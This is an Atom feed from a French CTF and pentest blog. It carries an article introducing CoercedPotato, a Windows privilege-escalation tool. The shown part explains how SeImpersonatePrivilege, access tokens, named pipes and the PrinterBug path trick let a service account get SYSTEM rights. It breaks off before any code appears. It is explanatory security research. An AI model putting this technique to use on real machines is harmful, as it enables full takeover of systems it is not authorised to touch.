<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-10-09T17:26:19+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Blog Hackvens - CTF Orga &amp;amp; CTF Team</title><subtitle>Hackvens CTF Orga &amp; Team Writeups</subtitle><entry><title type="html">Coerced Potato</title><link href="http://localhost:4000/articles/CoercedPotato.html" rel="alternate" type="text/html" title="Coerced Potato" /><published>2023-10-09T00:00:00+02:00</published><updated>2023-10-09T00:00:00+02:00</updated><id>http://localhost:4000/articles/CoercedPotato</id><content type="html" xml:base="http://localhost:4000/articles/CoercedPotato.html">&lt;p&gt;&lt;strong&gt;CoercedPotato - Une patate de plus ! ğŸ¥”&lt;/strong&gt;&lt;/p&gt;

&lt;h1 id=&quot;table-des-matiÃ¨res&quot;&gt;Table des matiÃ¨res&lt;/h1&gt;

&lt;p&gt;&lt;a href=&quot;#introduction&quot;&gt;&lt;strong&gt;1. Introduction&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;#une-histoire-de-privilÃ¨ges&quot;&gt;&lt;strong&gt;2.&lt;/strong&gt; &lt;strong&gt;Une histoire de privilÃ¨ges&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;#les-access-token-windows&quot;&gt;&lt;strong&gt;3.&lt;/strong&gt; &lt;strong&gt;Les AccessÂ TokenÂ Windows&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;#parlons-bien-parlons-named-pipe&quot;&gt;&lt;strong&gt;4.&lt;/strong&gt; &lt;strong&gt;Parlons bien, parlons Â«Â Named PipeÂ Â»&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;#un-peu-de-coercition-dauthentification&quot;&gt;&lt;strong&gt;5.&lt;/strong&gt; &lt;strong&gt;Un peu de Coercition dâ€™authentification&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;#un-peu-de-code-maintenant-c-on-fire&quot;&gt;&lt;strong&gt;6.&lt;/strong&gt; &lt;strong&gt;Un peu de code maintenant (C++ on fire)Â !&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;#remerciements&quot;&gt;&lt;strong&gt;7.&lt;/strong&gt; &lt;strong&gt;Remerciements&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&quot;introduction&quot;&gt;&lt;strong&gt;Introduction&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;Depuis 2016, de nombreux exploits nommÃ©sÂ Â«Â PotatoesÂ Â» ont Ã©tÃ© dÃ©couverts
et sont utilisÃ©s dans le but dâ€™Ã©lever ses privilÃ¨ges dans un systÃ¨me
dâ€™exploitation Windows. Le principe est toujours le mÃªmeÂ : passer dâ€™un
compte ayant les privilÃ¨ges adÃ©quats, souvent un compte de service, Ã 
&lt;strong&gt;NT AUTHORITY/SYSTEM&lt;/strong&gt; (le compte le plus privilÃ©giÃ© sous
Windows)&lt;strong&gt;&lt;em&gt;.&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Lâ€™objectif de cet article nâ€™est pas de passer en revue la collection
Â«Â PotatoesÂ Â» disponible Ã  ce jour. Pour cela, lâ€™excellent article de
@Blackwasp est disponible Ã  lâ€™URL suivant :
&lt;a href=&quot;https://hideandsec.sh/books/windows-sNL/page/in-the-potato-family-i-want-them-all.&quot;&gt;https://hideandsec.sh/books/windows-sNL/page/in-the-potato-family-i-want-them-all.&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;En revanche, la combinaison de plusieurs concepts connus a permis la
crÃ©ation dâ€™un nouvel outil : Â«Â &lt;strong&gt;CoercedPotato&lt;/strong&gt;Â Â». Cet outil permet
notamment dâ€™Ã©lever ses privilÃ¨ges sur les versions les plus rÃ©centes de
â€œWindows 10â€ et â€œWindows Server 2022â€, Ã  date de lâ€™article.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/articles/coercedpotato/image1.png&quot; style=&quot;width:6.3in;height:5.26389in; display:block; margin-left:auto; margin-right:auto&quot; alt=&quot;Une image contenant texte, capture dâ€™Ã©cran, Police Description gÃ©nÃ©rÃ©e automatiquement&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Notez que nous parlons de Â«Â nouvel outilÂ Â» et non pas Â«Â nouvelle
techniqueÂ Â», dans la mesure oÃ¹ celui-ci concatÃ¨ne les connaissances
actuelles concernant les &lt;strong&gt;impersonateÂ token&lt;/strong&gt; et les mÃ©thodes
permettant de forcer des authentifications via des &lt;strong&gt;fonctions RPC
vulnÃ©rables&lt;/strong&gt;. Ces deux concepts seront expliquÃ©s au fur et Ã  mesure de
lâ€™article.&lt;/p&gt;

&lt;p&gt;Mais avant de commencer, il va falloir passer en revue plusieurs
fondamentaux.&lt;/p&gt;

&lt;h1 id=&quot;une-histoire-de-privilÃ¨ges&quot;&gt;&lt;strong&gt;Une histoire de privilÃ¨ges&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;Â«Â If you have SeAssignPrimaryToken or SeImpersonatePrivilege, you are
SYSTEM Â». Câ€™est une citation issue dâ€™un tweet (un X ?) de &lt;em&gt;@decoder_it&lt;/em&gt;
qui nâ€™est en somme pas trÃ¨s loin de la rÃ©alitÃ©.&lt;/p&gt;

&lt;p&gt;Lors dâ€™un test dâ€™intrusion, et plus particuliÃ¨rement en test dâ€™intrusion
interne, nous parvenons frÃ©quemment Ã  exÃ©cuter du code Ã  distance. Dans
le cas dâ€™un systÃ¨me Windows, une fois une invite de commande obtenue sur
la machine ciblÃ©e, nous nous retrouvons parfois dans la situation
suivanteÂ : nous exÃ©cutons des commandes dans le contexte de sÃ©curitÃ© de
lâ€™utilisateur &lt;strong&gt;NT AUTHORITY\LOCAL SERVICE&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/articles/coercedpotato/image2.png&quot; style=&quot;width:3.88203in;height:0.98002in; display:block; margin-left:auto; margin-right:auto&quot; alt=&quot;Une image contenant texte, capture dâ€™Ã©cran, Police, ligne Description gÃ©nÃ©rÃ©e automatiquement&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ce compte dispose de privilÃ¨ges restreints sur le systÃ¨me. Lâ€™objectif
est donc dâ€™Ã©lever nos privilÃ¨ges et dâ€™obtenir une invite de commandes
dans le contexte de lâ€™utilisateur &lt;strong&gt;NT AUTHORITY\SYSTEM&lt;/strong&gt;, afin de
prendre le contrÃ´le complet du systÃ¨me. Cela peut ensuite permettre de
tenter de rebondir sur dâ€™autres machines du rÃ©seau, en rÃ©cupÃ©rant des
identifiants en mÃ©moires vives, en interagissant avec les &lt;em&gt;access
tokens&lt;/em&gt; de Windows, en rÃ©cupÃ©rant la base des utilisateurs
locaux, etc. Maisâ€¦ on sâ€™Ã©gareÂ !Â ğŸ˜Š&lt;/p&gt;

&lt;p&gt;Pour revenir au sujet initial, lorsque nous listons les privilÃ¨ges de
lâ€™utilisateur &lt;strong&gt;NT AUTHORITY\LOCAL SERVICE&lt;/strong&gt;, celui-ci dispose
normalement du privilÃ¨ge &lt;strong&gt;SeImpersonatePrivilege&lt;/strong&gt;Â :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/articles/coercedpotato/image3.png&quot; style=&quot;width:6.3in;height:1.77431in; display:block; margin-left:auto; margin-right:auto&quot; alt=&quot;Une image contenant texte, capture dâ€™Ã©cran, Police Description gÃ©nÃ©rÃ©e automatiquement&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Câ€™est ce privilÃ¨ge qui nous intÃ©resse tout particuliÃ¨rement pour la
suite de lâ€™articleÂ !&lt;/p&gt;

&lt;p&gt;Si nous suivons la documentation officielle de Microsoft, ce privilÃ¨ge
permet &lt;strong&gt;Â«Â &lt;em&gt;lâ€™emprunt dâ€™identitÃ© dâ€™un client aprÃ¨s lâ€™authentification&lt;/em&gt;&lt;/strong&gt;
&lt;em&gt;et la crÃ©ation de droits dâ€™utilisateur &lt;strong&gt;dâ€™objets globaux.&lt;/strong&gt;&lt;/em&gt;Â Â»&lt;/p&gt;

&lt;p&gt;&lt;em&gt;&lt;a href=&quot;https://learn.microsoft.com/fr-fr/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege&quot;&gt;https://learn.microsoft.com/fr-fr/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;ConcrÃ¨tement, dans un environnement Windows, lorsquâ€™un utilisateur
possÃ¨de le privilÃ¨ge &lt;strong&gt;SeImpersonatePrivilege&lt;/strong&gt;, il a la possibilitÃ© de
dÃ©marrer des processus (câ€™est-Ã -dire des programmes, par exemple
&lt;strong&gt;cmd.exe&lt;/strong&gt;) au nom dâ€™un autre utilisateur. Cela se fait en appelant la
fonction &lt;strong&gt;CreateProcessWithTokenW()&lt;/strong&gt; dans le contexte de sÃ©curitÃ© de
lâ€™utilisateur.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw&quot;&gt;&lt;em&gt;https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;A noter quâ€™il existe un privilÃ¨ge trÃ¨s similaire Ã 
&lt;strong&gt;SeImpersonatePrivilegeÂ &lt;/strong&gt;: &lt;strong&gt;SeAssignPrimaryToken&lt;/strong&gt;. Il permet
Ã©galement le dÃ©marrage dâ€™un processus au nom dâ€™un autre utilisateur avec
la fonction &lt;strong&gt;CreateProcessAsUser()&lt;/strong&gt;, mais nous ne rentrerons pas dans
les dÃ©tails dans cet article.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;&lt;a href=&quot;https://learn.microsoft.com/fr-fr/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasuserw&quot;&gt;https://learn.microsoft.com/fr-fr/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasuserw&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Toutes les techniques dites Â«Â &lt;strong&gt;Potatoes&lt;/strong&gt;Â Â» reposent sur ces privilÃ¨ges
(Ã  lâ€™exception de RemotePotato) pour obtenir des droits &lt;strong&gt;NT
AUTHORITY\SYSTEM&lt;/strong&gt; (nous appellerons Ã§a les droits &lt;strong&gt;SYSTEM&lt;/strong&gt; pour le
reste de lâ€™article) sur une machine Windows afin de la compromettre.
Vous lâ€™aurez compris, &lt;strong&gt;SeAssignPrimaryToken&lt;/strong&gt; et
&lt;strong&gt;SeImpersonatePrivilege&lt;/strong&gt; sont des privilÃ¨ges trÃ¨s prÃ©cieux pour un
attaquant et offrent (quasi) toujours la possibilitÃ© dâ€™Ã©lever ses
privilÃ¨ges.&lt;/p&gt;

&lt;p&gt;Lâ€™objectif de lâ€™article est donc de montrer une nouvelle technique
exploitant ces privilÃ¨ges. Il est maintenant temps de rentrer dans le
vif du sujetÂ !Â &lt;/p&gt;

&lt;h1 id=&quot;les-accesstokenwindows&quot;&gt;&lt;strong&gt;Les AccessÂ TokenÂ Windows&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;En parcourant la documentation de Microsoft, il est possible de
retrouver la dÃ©finition des fonctions Ã©noncÃ©es plus tÃ´tÂ :
&lt;strong&gt;CreateProcessWithTokenW&lt;/strong&gt; et &lt;strong&gt;CreateProcessAsUserW&lt;/strong&gt;. La structure de
ces fonctions est la suivanteÂ :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/articles/coercedpotato/image4.png&quot; style=&quot;width:3.11927in;height:2.16522in;display:block; margin-left:auto; margin-right:auto&quot; alt=&quot;Une image contenant texte, capture dâ€™Ã©cran, nombre, Police Description gÃ©nÃ©rÃ©e automatiquement&quot; /&gt;&lt;img src=&quot;/assets/img/articles/coercedpotato/image5.png&quot; style=&quot;width:2.90177in;height:2.13404in;display:block; margin-left:auto; margin-right:auto&quot; alt=&quot;Une image contenant texte, capture dâ€™Ã©cran, Police, nombre Description gÃ©nÃ©rÃ©e automatiquement&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Il est intÃ©ressant de noter que ces deux fonctions nÃ©cessitent un
&lt;strong&gt;access token&lt;/strong&gt; en argument pour Ãªtre utilisÃ©es, et plus spÃ©cifiquement
un &lt;strong&gt;primary token&lt;/strong&gt;. Mais quâ€™est-ce que câ€™estÂ cette histoire de
&lt;strong&gt;token&lt;/strong&gt; ?&lt;/p&gt;

&lt;p&gt;Pour reprendre sa dÃ©finition telle que dÃ©crite par Microsoft, les
&lt;em&gt;&lt;strong&gt;access token&lt;/strong&gt; sont Â«Â des objets qui dÃ©crivent le contexte de
sÃ©curitÃ© dâ€™un processus ou dâ€™un thread.&lt;/em&gt;Â Â».&lt;/p&gt;

&lt;p&gt;ConcrÃ¨tement, lâ€™&lt;strong&gt;access token&lt;/strong&gt;, ou jeton dâ€™accÃ¨s, est obtenu aprÃ¨s une
authentification rÃ©ussie et contient un ensemble dâ€™informations
essentielles pour Windows, tel que lâ€™identitÃ© de lâ€™utilisateur, son
groupe, sa liste de contrÃ´le dâ€™accÃ¨s (ACL), ses privilÃ¨ges et surtout,
le type de token. Il pourrait par exemple Ãªtre comparÃ© Ã  un jeton JWT
utilisÃ© par une application web.&lt;/p&gt;

&lt;p&gt;Par exemple, si je dÃ©marre le processus &lt;strong&gt;cmd.exe&lt;/strong&gt; avec un &lt;strong&gt;access
token&lt;/strong&gt; appartenant Ã  lâ€™utilisateur &lt;strong&gt;vagrant&lt;/strong&gt;, &lt;strong&gt;cmd.exe&lt;/strong&gt; aura les
privilÃ¨ges du compte &lt;strong&gt;vagrant&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://learn.microsoft.com/fr-fr/windows/win32/secauthz/access-tokens&quot;&gt;https://learn.microsoft.com/fr-fr/windows/win32/secauthz/access-tokens&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Il existe deux types dâ€™&lt;strong&gt;access token&lt;/strong&gt;Â : les &lt;strong&gt;primary token&lt;/strong&gt; et les
&lt;strong&gt;impersonation token&lt;/strong&gt;. Pour comprendre la diffÃ©rence entre ces deux
types de jetons, il est nÃ©cessaire de connaÃ®tre la diffÃ©rence entre un
thread et un processus dans un systÃ¨me Windows.&lt;/p&gt;

&lt;p&gt;Pour faire simple, un processus est un espace mÃ©moire virtuel exÃ©cutant
du code sur le systÃ¨me. Un thread correspond Ã  du code exÃ©cutÃ© depuis un
processus. Il est donc temporaire et est dÃ©truit une fois terminÃ©.&lt;/p&gt;

&lt;p&gt;Pour imager, lorsque lâ€™application Word est utilisÃ©e, le processus
&lt;strong&gt;WINWORD.exe&lt;/strong&gt; est lancÃ© sur la machine. Ce processus est dÃ©marrÃ© par
lâ€™utilisateur avec son &lt;strong&gt;primary token&lt;/strong&gt;. Lâ€™application va ensuite
utiliser des threads, par exemple pour gÃ©rer des tÃ¢ches en arriÃ¨re-plan
(affichage de lâ€™interface graphique, traitement des entrÃ©es utilisateur,
etc.). Cela permet une expÃ©rience fluide lors de lâ€™utilisation de Word.
Ces threads seront exÃ©cutÃ©s Ã  lâ€™aide dâ€™un &lt;strong&gt;impersonation token&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://learn.microsoft.com/fr-fr/windows/win32/com/processes--threads--and-apartments&quot;&gt;https://learn.microsoft.com/fr-fr/windows/win32/com/processes--threads--and-apartments&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Maintenant que les bases sont acquises, revenons Ã  nos moutons.&lt;/p&gt;

&lt;p&gt;Comme expliquÃ© prÃ©cÃ©demment, pour pouvoir dÃ©marrer un processus dans le
contexte dâ€™un utilisateur, il nous faut deux chosesÂ : le privilÃ¨ge
adÃ©quat (&lt;strong&gt;SeImpersonatePrivilege&lt;/strong&gt; ou &lt;strong&gt;SeAssignPrimaryToken&lt;/strong&gt;) et un
&lt;strong&gt;primary token&lt;/strong&gt;. Bonne nouvelleÂ pour nous, pour ce dernier prÃ©requis,
les deux types de jetons sont interchangeables grÃ¢ce Ã  la fonction
&lt;strong&gt;DuplicateTokenEx&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex&quot;&gt;https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Ainsi, lâ€™obtention dâ€™un &lt;strong&gt;impersonation token&lt;/strong&gt; dâ€™un utilisateur (au
hasard, le compte &lt;strong&gt;SYSTEM&lt;/strong&gt;) permet, grÃ¢ce Ã  &lt;strong&gt;DuplicateTokenEx&lt;/strong&gt;,
dâ€™obtenir un &lt;strong&gt;primary token&lt;/strong&gt; et ainsi de crÃ©er un processus dans son
contexte de sÃ©curitÃ© (et donc avec son identitÃ© et surtout ses
privilÃ¨ges ğŸ˜).&lt;/p&gt;

&lt;p&gt;Câ€™est bien beau tout Ã§a, mais une question (trÃ¨sÂ ?) importante subsisteâ€¦
Comment rÃ©cupÃ©rer ce fameux &lt;strong&gt;access&lt;/strong&gt; &lt;strong&gt;token&lt;/strong&gt;Â ?&lt;/p&gt;

&lt;h1 id=&quot;parlons-bien-parlons-named-pipe&quot;&gt;&lt;strong&gt;Parlons bien, parlons Â«Â Named PipeÂ Â»&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;Minute papillonÂ ! Avant de pouvoir expliquer comment rÃ©cupÃ©rer un
&lt;strong&gt;access token&lt;/strong&gt;, il est nÃ©cessaire de repasser sur certaines bases
(encoreÂ ?Â ). Promis, câ€™est la derniÃ¨re foisÂ !&lt;/p&gt;

&lt;p&gt;Traditionnellement, les techniques Â«Â PotatoesÂ Â» (Hot Potato, Sweet
Potato, Local Potato, etc.) utilisent des fonctions RPC pour forcer
lâ€™utilisateur &lt;strong&gt;NT AUTHORITY\SYSTEM&lt;/strong&gt;Â Ã  sâ€™authentifier sur un proxy
local que lâ€™attaquant contrÃ´le, puis Ã  relayer cette authentification
jusquâ€™Ã  rÃ©cupÃ©rer un &lt;strong&gt;impersonation token&lt;/strong&gt; du compte &lt;strong&gt;SYSTEM&lt;/strong&gt;. Mais
lâ€™objectif de lâ€™article nâ€™est pas de revoir ces techniques bien connues
!&lt;/p&gt;

&lt;p&gt;Il existe en fait un autre moyen pour aboutir au mÃªme rÃ©sultatÂ :
lâ€™utilisation de Â«Â Named PipeÂ Â».&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/articles/coercedpotato/image6.jpg&quot; style=&quot;width:1.76563in;height:1.10352in;display:block; margin-left:auto; margin-right:auto&quot; alt=&quot;RenÃ© Magritte - Ceci n&amp;#39;est pas une pipe - Museum TV&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Dâ€™aprÃ¨s la documentation de Microsoft, un &lt;em&gt;Â«Â pipe est une section de
mÃ©moire partagÃ©e qui traite la communication entre un serveur pipe et un
client. Le processus qui crÃ©e le pipe est un &lt;strong&gt;serveur&lt;/strong&gt;&lt;/em&gt; &lt;em&gt;&lt;strong&gt;pipe&lt;/strong&gt;. Un
processus qui se connecte au pipe est &lt;strong&gt;un client&lt;/strong&gt;. Un processus Ã©crit
des informations dans le pipe, puis lâ€™autre processus lit les
informations du pipe. Cette vue dâ€™ensemble dÃ©crit comment crÃ©er, gÃ©rer
et utiliser des pipes.&lt;/em&gt;Â Â»&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/ipc/pipes&quot;&gt;https://learn.microsoft.com/en-us/windows/win32/ipc/pipes&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Pour rÃ©sumer, les &lt;strong&gt;pipes&lt;/strong&gt; permettent lâ€™Ã©change de donnÃ©es
inter-processus (IPC). Sous Windows, il existe deux types de &lt;em&gt;pipe&lt;/em&gt;Â :&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Anonymous pipeÂ :&lt;/strong&gt; Les â€œAnonymous pipesâ€ transfÃ¨rent les donnÃ©es
entre un processus parent et un processus enfant.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Named pipeÂ :&lt;/strong&gt; Les â€œNamed pipesâ€ transfÃ¨rent des donnÃ©es entre des
processus qui nâ€™ont pas de lien de parentÃ©, Ã  condition quâ€™il ait
les privilÃ¨ges appropriÃ©s pour interagir avec le processus.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Dans cet article ce qui nous intÃ©resse, ce sont les &lt;strong&gt;named pipe&lt;/strong&gt;.
PourquoiÂ ?&lt;/p&gt;

&lt;p&gt;Parce quâ€™un processus ayant crÃ©Ã© un serveur pipe peut utiliser une
fonction trÃ¨s utile, surtout dans notre cas :
&lt;strong&gt;ImpersonateNamedPipeClient()&lt;/strong&gt;. Cette fonction permet de nous placer
dans le contexte de sÃ©curitÃ© du client contactant le &lt;strong&gt;named pipeÂ &lt;/strong&gt;! La
principale condition pour pouvoir lâ€™utiliser est de possÃ©der le
privilÃ¨ge &lt;strong&gt;SeImpersonatePrivilege&lt;/strong&gt;â€¦ Parfait, câ€™est ce que nous allons
utiliser !Â ğŸ˜Š&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient&quot;&gt;https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Cette fonction permet au serveur pipe recevant une connexion entrante
dâ€™un client (par exemple dâ€™un autre processus) dâ€™emprunter lâ€™identitÃ© du
client pour effectuer des actions en son nom, dans son contexte de
sÃ©curitÃ©, en utilisant son &lt;strong&gt;access token&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Typiquement, dans lâ€™exemple ci-dessous, nous crÃ©ons un serveur pipe
accessible via le Named Pipe &lt;strong&gt;\.\pipe\mynamedpipe&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/articles/coercedpotato/image7.png&quot; style=&quot;width:5.72917in;height:0.31944in;display:block; margin-left:auto; margin-right:auto&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Puis, lorsquâ€™un utilisateur se connecte Ã  ce serveur pipe, nous
rÃ©cupÃ©rons les informations liÃ©es Ã  son &lt;strong&gt;access token&lt;/strong&gt;. Dans lâ€™exemple
ci-dessous, nous nous connectons au serveur pipe avec lâ€™utilisateur
&lt;strong&gt;lab\advens&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/articles/coercedpotato/image8.png&quot; style=&quot;width:6.3in;height:3.51944in;display:block; margin-left:auto; margin-right:auto&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Donc, pour rÃ©sumer, si nous disposons les privilÃ¨ges requis et parvenons
Ã  forcer lâ€™utilisateurÂ &lt;strong&gt;NT AUTHORITY\SYSTEM&lt;/strong&gt;Â Ã  sâ€™authentifier sur un
&lt;strong&gt;serveur&lt;/strong&gt; &lt;strong&gt;pipe&lt;/strong&gt; que nous contrÃ´lons, nous sommes en mesure
dâ€™exÃ©cuter des processus en son nom, et donc du code (câ€™est pas beau Ã§a
?Â ğŸ˜Š).&lt;/p&gt;

&lt;p&gt;ConcrÃ¨tement, câ€™est exactement ce quâ€™a expliquÃ© @Itm4n dans son blog. En
utilisant la vulnÃ©rabilitÃ© &lt;strong&gt;PrinterBug&lt;/strong&gt;, lâ€™outil &lt;strong&gt;PrintSpoofer&lt;/strong&gt;
permet dâ€™Ã©lever ses privilÃ¨ges et obtenir des droits &lt;strong&gt;NT
AUTHORITY\SYSTEM&lt;/strong&gt; Ã  partir dâ€™un compte disposant notamment du privilÃ¨ge
&lt;strong&gt;SeImpersonatePrivilege&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Pour ne pas simplement paraphraser son article passionnant, je vous
invite Ã  le lire si vous nâ€™Ãªtes pas particuliÃ¨rement familier avec
lâ€™outil &lt;strong&gt;PrintSpoofer&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/#getting-a-system-token&quot;&gt;https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Le &lt;strong&gt;PrinterBug&lt;/strong&gt; exploite une Â«Â fonctionnalitÃ©Â Â» implÃ©mentÃ©e dans
lâ€™interface RPC MS-RPRN en appelant la procÃ©dure RPC
&lt;strong&gt;RpcRemoteFindFirstPrinterChangeNotificationEx&lt;/strong&gt;, qui permet dâ€™envoyer
une notification dâ€™impression Ã  un serveur dâ€™impression. Pour mieux
comprendre, cette fonction RPC peut Ãªtre dÃ©tournÃ©e pour forcer une
machine Ã  sâ€™authentifier oÃ¹ lâ€™on veut, simplement en indiquant un chemin
vers un (faux) serveur dâ€™impression (situÃ© sur un Named Pipe par
exemple), ce qui peut Ãªtre utile dans le cadre dâ€™autres exploits (&lt;a href=&quot;mailto:https://medium.com/@riccardo.ancarani94/exploiting-unconstrained-delegation-a81eabbd6976&quot;&gt;Voir
cet
article&lt;/a&gt;).&lt;/p&gt;

&lt;p&gt;NÃ©anmoins, ce qui nous intÃ©resse ici, câ€™est le bug utilisÃ© aprÃ¨s
exploitation de la vulnÃ©rabilitÃ© &lt;strong&gt;PrinterBug&lt;/strong&gt;. Celui-ci rÃ©side dans un
problÃ¨me dâ€™interprÃ©tation des Â«Â /Â Â» par le systÃ¨me Windows. Je
mâ€™expliqueÂ :&lt;/p&gt;

&lt;p&gt;Lorsque la procÃ©dure RPC
&lt;strong&gt;RpcRemoteFindFirstPrinterChangeNotificationEx&lt;/strong&gt; est appelÃ©e, le
processus &lt;strong&gt;spoolsv.exe&lt;/strong&gt;, qui est dÃ©marrÃ© dans le contexte de sÃ©curitÃ©
de lâ€™utilisateur &lt;strong&gt;NT AUTHORITY\SYSTEM&lt;/strong&gt;, vÃ©rifie le chemin spÃ©cifiÃ© par
lâ€™utilisateur. Si le named pipe indiquÃ© nâ€™est pas de la forme
&lt;strong&gt;\somewhere\pipe\spoolss&lt;/strong&gt;, une erreur est renvoyÃ©e, sinon, il tente
de sâ€™y connecter.&lt;/p&gt;

&lt;p&gt;Par dÃ©faut, il nâ€™est pas possible de crÃ©er un named pipe dÃ©jÃ  existant,
donc pas possible dâ€™Ã©couter sur &lt;strong&gt;\localhost\pipe\spoolss&lt;/strong&gt; ! En
revanche, lorsque le chemin spÃ©cifiÃ© est de la forme
&lt;strong&gt;\somewhere/pipe/controlled&lt;/strong&gt;, alors le chemin spÃ©cifiÃ© est considÃ©rÃ©
comme valide (oui) et il est finalement corrigÃ© par le systÃ¨me qui
ajoute &lt;strong&gt;\pipe\spoolss&lt;/strong&gt; Ã  la fin. Par consÃ©quent, une connexion est
effectuÃ©e sur &lt;strong&gt;\somewhere\pipe\controlled\pipe\spoolss&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Dans le cadre de &lt;strong&gt;Printspoofer&lt;/strong&gt;, la connexion effectuÃ©e via le
processus &lt;strong&gt;spoolsv.exe&lt;/strong&gt;, donc dans le contexte de sÃ©curitÃ© du compte
&lt;strong&gt;NT AUTHORIY\SYSTEM&lt;/strong&gt;, se fait localement sur
&lt;strong&gt;\localhost\pipe\controlled\pipe\spoolss&lt;/strong&gt;. BingoÂ ! Câ€™est un named
pipe sur lequel il est possible dâ€™Ã©couter.&lt;/p&gt;

&lt;p&gt;Pour rÃ©sumer, grÃ¢ce Ã  ce bug, il est possible de rÃ©cupÃ©rer un &lt;strong&gt;access
token&lt;/strong&gt; associÃ© au compte &lt;strong&gt;NT AUTHORITY\SYSTEM,&lt;/strong&gt; via une connexion sur
un Named Pipe que nous contrÃ´lons. DÃ¨s lors, il est possible de dÃ©marrer
un cmd.exe avec les privilÃ¨ges &lt;strong&gt;SYSTEM&lt;/strong&gt;Â !&lt;/p&gt;

&lt;p&gt;Mais que se passerait-il si le spooler dâ€™impression Windows nâ€™est pas
activÃ© sur la machineÂ ?Â &lt;/p&gt;

&lt;p&gt;Câ€™est lÃ  quâ€™interviennent des techniques de coercition
dâ€™authentification plus rÃ©cemment dÃ©couvertes et notre outilÂ :
&lt;strong&gt;CoercedPotato&lt;/strong&gt;.&lt;/p&gt;

&lt;h1 id=&quot;un-peu-de-coercition-dauthentification&quot;&gt;&lt;strong&gt;Un peu de Coercition dâ€™authentification&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;En 2021, la vulnÃ©rabilitÃ© PetitPotam a permis de dÃ©voiler au grand jour
la possibilitÃ© de forcer une machine Ã  sâ€™authentifier nâ€™importe oÃ¹ sur
le rÃ©seau, notamment via la fonction RPC &lt;strong&gt;EfsRpcOpenFileRaw&lt;/strong&gt;
